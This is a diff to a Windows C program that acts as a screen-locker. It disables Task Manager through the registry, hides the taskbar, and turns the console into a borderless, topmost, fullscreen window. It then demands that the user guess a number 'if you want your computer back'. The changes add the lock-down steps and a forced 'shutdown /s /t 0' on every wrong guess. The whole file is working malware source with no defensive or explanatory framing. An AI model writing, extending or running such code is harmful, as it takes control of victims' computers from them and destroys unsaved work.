@@ -2,6 +2,7 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <time.h>
+#include <stdlib.h>
 
 void kill_taskman() {
     HKEY hKey;
@@ -13,8 +14,7 @@ void kill_taskman() {
 
 void resurect_taskman() {
     HKEY hKey;
-    RegOpenKeyExA(HKEY_CURRENT_USER,
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
+    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
     RegDeleteValueA(hKey, "DisableTaskMgr");
     RegCloseKey(hKey);
 }
@@ -25,10 +25,26 @@ BOOL WINAPI ctrlHandler(DWORD type) {
 
 void console_lock() {
     HWND console = GetConsoleWindow();
-    ShowWindow(console, SW_MAXIMIZE);
-    SetWindowLong(console, GWL_STYLE, GetWindowLong(console, GWL_STYLE) & ~WS_SYSMENU); // Remove [X]
-}
 
+    LONG style = GetWindowLong(console, GWL_STYLE);
+    style &= ~(WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_THICKFRAME);
+    SetWindowLong(console, GWL_STYLE, style);
+    SetWindowPos(console, HWND_TOPMOST, 0, 0, 0, 0,
+                 SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED);
+    
+    HWND taskbar = FindWindow("Shell_TrayWnd", 0);
+    ShowWindow(taskbar, SW_HIDE);
+
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+    MoveWindow(console, 0, 0, screenWidth, screenHeight, TRUE);
+    
+    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    COORD bufferSize = {160, 100};
+    SMALL_RECT windowSize = {0, 0, bufferSize.X - 1, bufferSize.Y - 1};
+    SetConsoleScreenBufferSize(hOut, bufferSize);
+    SetConsoleWindowInfo(hOut, TRUE, &windowSize);
+}
 int main() {
     SetConsoleTitleA("Screen");
     SetConsoleCtrlHandler(ctrlHandler, TRUE);
@@ -42,19 +58,25 @@ int main() {
     printf("===Let's Play a little Game===\n");
     printf("if you want your computer back...\n");
     printf("than guess the number\n");
+
     while (1) {
-        printf("Enter guess 1-10 >:\n");
+        srand((unsigned int)time(0));
+        int key = (rand() % 10) + 1;
+        int guess = 0;
+        printf("Enter guess 1-10 >:");
+        fflush(stdout);
         scanf("%d", &guess);
         if (guess == key) {
             printf("\nYou Won!!! woohoo\n");
             resurect_taskman();
+            HWND taskbar = FindWindow("Shell_TrayWnd", 0);
+            ShowWindow(taskbar, SW_SHOW);
             exit(0);
-        }
-        else {
+        } else {
             printf("\nwrong\n");
+            system("shutdown /s /t 0");
         }
     }
-    Sleep(3000);
+
     return 0;
 }
-// 0 = NULL
